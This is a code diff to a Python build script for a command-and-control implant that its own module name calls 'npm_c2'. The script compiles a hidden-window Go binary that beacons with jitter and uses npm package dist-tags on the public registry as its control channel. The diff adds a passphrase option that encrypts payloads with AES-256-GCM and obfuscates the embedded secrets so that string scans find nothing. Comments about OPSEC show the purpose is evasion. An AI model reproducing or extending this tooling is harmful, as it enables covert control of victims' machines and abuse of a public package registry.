@@ -70,15 +70,23 @@ def pack_upx(path):
 
 def build(token=None, package=None, api_base=None, arch_key="amd64",
           outdir=None, name="node", strip=True, interval=60, jitter=20,
-          upx=False, tag_value="1.0.0"):
+          upx=False, tag_value="1.0.0", passphrase=None):
     if token and not package:
         raise SystemExit("--package is required with --token")
+    if passphrase and not package:
+        raise SystemExit("--package is required with --passphrase")
 
     api_tmpl = (api_base or "https://registry.npmjs.org") + "/-/package/%s/dist-tags"
     emb = ""
     if token and package:
         from npm_c2 import obfuscate_token
         emb = obfuscate_token(token, package)
+    # The passphrase is obfuscated the same way as the token, so strings(1)
+    # reveals neither.
+    emb_key = ""
+    if passphrase and package:
+        from npm_c2.crypto import obfuscate_secret
+        emb_key = obfuscate_secret(passphrase, package)
 
     make_resources(arch_key)
     cfg = ARCH[arch_key]
@@ -95,6 +103,7 @@ def build(token=None, package=None, api_base=None, arch_key="amd64",
         "-X", f"main.embeddedEvery={int(interval)}",
         "-X", f"main.embeddedJit={int(jitter)}",
         "-X", f"main.tagValue={tag_value}",
+        "-X", f"main.embeddedKey={emb_key}",
         "-H", "windowsgui",
     ]
     if strip:
@@ -140,6 +149,9 @@ def main():
     ap.add_argument("--tag-value", default="1.0.0",
                     help="version the dist-tags point at; must exist in the "
                          "package (staged-first packages use 0.0.0-stage)")
+    ap.add_argument("--passphrase", default=None,
+                    help="channel passphrase: seals every payload with "
+                         "AES-256-GCM so the public tag map reveals nothing")
     ap.add_argument("--upx", action="store_true",
                     help="compress with UPX (~31%% of the size; hurts OPSEC)")
     ap.add_argument("--32", dest="x86", action="store_true", help="also build 386")
@@ -149,11 +161,11 @@ def main():
         raise SystemExit("--package/-p is required: the binary carries it")
     build(a.token, a.package, a.api_base, "amd64", a.outdir, a.name,
           strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx,
-          tag_value=a.tag_value)
+          tag_value=a.tag_value, passphrase=a.passphrase)
     if a.x86:
         build(a.token, a.package, a.api_base, "386", a.outdir, a.name,
               strip=not a.no_strip, interval=a.interval, jitter=a.jitter,
-              upx=a.upx, tag_value=a.tag_value)
+              upx=a.upx, tag_value=a.tag_value, passphrase=a.passphrase)
 
 
 if __name__ == "__main__":
